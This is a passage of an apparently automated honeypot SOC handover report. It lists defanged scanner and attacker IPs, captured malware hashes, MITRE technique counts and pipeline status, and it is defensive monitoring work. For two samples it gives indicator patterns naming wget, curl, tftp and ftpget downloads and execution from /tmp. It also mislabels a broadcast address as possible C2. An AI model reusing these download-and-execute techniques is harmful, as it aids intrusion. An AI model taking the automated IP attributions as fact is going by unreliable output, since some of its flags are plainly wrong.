| `2026-07-21 04:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.78.118[.]104` | **30** | 2026-07-21 03:58 | 2026-07-21 03:59 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.78.207[.]34` | **30** | 2026-07-21 03:19 | 2026-07-21 03:20 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `35.205.211[.]220` | **30** | 2026-07-21 02:58 | 2026-07-21 02:58 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-21 03:08 | 2026-07-21 04:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-21 04:12 | 2026-07-21 04:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-21 03:18 | 2026-07-21 03:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]81` | **3** | 2026-07-21 04:03 | 2026-07-21 04:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-07-21 04:36 | 2026-07-21 04:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | **3** | 2026-07-21 04:05 | 2026-07-21 04:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | **3** | 2026-07-21 04:05 | 2026-07-21 04:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]88` | **3** | 2026-07-21 04:04 | 2026-07-21 04:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **3** | 2026-07-21 03:00 | 2026-07-21 03:52 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-07-21 03:18 | 2026-07-21 04:18 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `179.61.192[.]156` | **2** | 2026-07-21 03:57 | 2026-07-21 04:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.40.30[.]168` | **2** | 2026-07-21 04:01 | 2026-07-21 04:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-21 03:26 | 2026-07-21 03:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]37` | **2** | 2026-07-21 04:49 | 2026-07-21 04:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-07-21 04:41 | 2026-07-21 04:42 | 10s | 0 | `T1592` | 🟢 LOW |
| `118.196.34[.]237` | 1 | 2026-07-21 04:37 | 2026-07-21 04:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-07-21 04:06 | 2026-07-21 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.147[.]111` | 1 | 2026-07-21 03:08 | 2026-07-21 03:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.174.32[.]95` | 1 | 2026-07-21 04:34 | 2026-07-21 04:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `136.116.189[.]132` | 1 | 2026-07-21 03:26 | 2026-07-21 03:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]208` | 1 | 2026-07-21 03:09 | 2026-07-21 03:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.22.82[.]116` | 1 | 2026-07-21 04:32 | 2026-07-21 04:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.96.195[.]57` | 1 | 2026-07-21 03:46 | 2026-07-21 03:46 | 12s | 0 | `T1592` | 🟢 LOW |
| `189.52.52[.]162` | 1 | 2026-07-21 04:25 | 2026-07-21 04:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | 1 | 2026-07-21 04:18 | 2026-07-21 04:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.133.158[.]175` | 1 | 2026-07-21 04:26 | 2026-07-21 04:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.3.129[.]142` | 1 | 2026-07-21 03:41 | 2026-07-21 03:41 | 35s | 0 | `T1592` | 🟢 LOW |
| `27.14.227[.]116` | 1 | 2026-07-21 03:55 | 2026-07-21 03:55 | 14s | 0 | `T1592` | 🟢 LOW |
| `38.199.201[.]48` | 1 | 2026-07-21 03:15 | 2026-07-21 03:16 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-07-21 03:44 | 2026-07-21 03:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]107` | 1 | 2026-07-21 03:29 | 2026-07-21 03:29 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]224` | 1 | 2026-07-21 04:50 | 2026-07-21 04:50 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]52` | 1 | 2026-07-21 04:01 | 2026-07-21 04:01 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]185` | 1 | 2026-07-21 04:30 | 2026-07-21 04:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]3` | 1 | 2026-07-21 03:20 | 2026-07-21 03:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-07-21 04:29 | 2026-07-21 04:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.236.211[.]54` | 1 | 2026-07-21 03:36 | 2026-07-21 03:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]13` | 1 | 2026-07-21 04:08 | 2026-07-21 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]146` | 1 | 2026-07-21 04:08 | 2026-07-21 04:08 | 10s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]176` | 1 | 2026-07-21 04:04 | 2026-07-21 04:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `89.37.172[.]132` | 1 | 2026-07-21 04:07 | 2026-07-21 04:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.37.172[.]157` | 1 | 2026-07-21 04:04 | 2026-07-21 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.42[.]36` | 1 | 2026-07-21 03:52 | 2026-07-21 03:53 | 8s | 0 | `T1592` | 🟢 LOW |
| `99.238.166[.]78` | 1 | 2026-07-21 04:40 | 2026-07-21 04:40 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `38.199.201[.]48` | AR | ALVAREZ MILCIADE | **100** ⚠️ | 1 |
| `122.170.111[.]140` | IN | ABTS-MUMBAI | **100** ⚠️ | 50 |
| `83.239.108[.]218` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 50 |
| `192.253.248[.]180` | NL | Secure Internet LLC (UK) | **100** ⚠️ | 50 |
| `65.20.163[.]103` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `188.43.204[.]45` | RU | TTK | **100** ⚠️ | 50 |
| `45.79.207[.]71` | US | Linode | **100** ⚠️ | 50 |
| `182.96.195[.]57` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 2 |
| `213.130.207[.]177` | LT | Mobile Services Lithuania | **100** ⚠️ | 50 |
| `203.123.219[.]137` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 353 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 344 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 53 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 52 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 51 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 526 cases |
| Tool 34  | Credential Extractor        | ✅ 370 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 114 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (4.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 76 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 344 priority case(s) shown individually · 47 recon entry/entries in table (17 group(s) consolidating 129 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-21T06:33:52Z_
